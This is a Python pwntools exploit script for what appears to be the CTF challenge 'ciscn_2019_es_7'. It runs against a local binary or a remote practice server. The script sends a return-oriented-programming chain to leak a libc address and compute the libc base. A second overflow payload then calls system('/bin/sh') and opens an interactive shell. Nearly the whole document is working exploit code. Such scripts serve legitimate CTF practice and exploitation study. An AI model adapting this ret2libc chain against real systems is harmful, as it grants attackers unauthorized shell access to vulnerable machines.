import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_es_7')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_2019_es_7')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28868)
			elf=ELF('./ciscn_2019_es_7')
			libc=ELF('../../x64libc/libc.so.6')

		
		add_sp_8_ret=0x00000000004003a5
		addr2=0x000000000400503
		addr1=0x0000000004004F1
		#gdb.attach(io)
		#pause()
		io.sendline('a'*8+p64(1)+p64(add_sp_8_ret)+p64(1)+p64(addr2)+p64(addr1))
		io.recv(0x50)
		libc_base=u64(io.recv()[:8])-libc.sym['__libc_start_main']-231
		success('libc_base:'+hex(libc_base))
		libc.address=libc_base
		pop_rdi=0x00000000004005a3
		pay='a'*0x10+p64(pop_rdi)+p64(libc.search('/bin/sh\x00').next())+p64(libc.sym['system'])
		io.sendline(pay)


		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue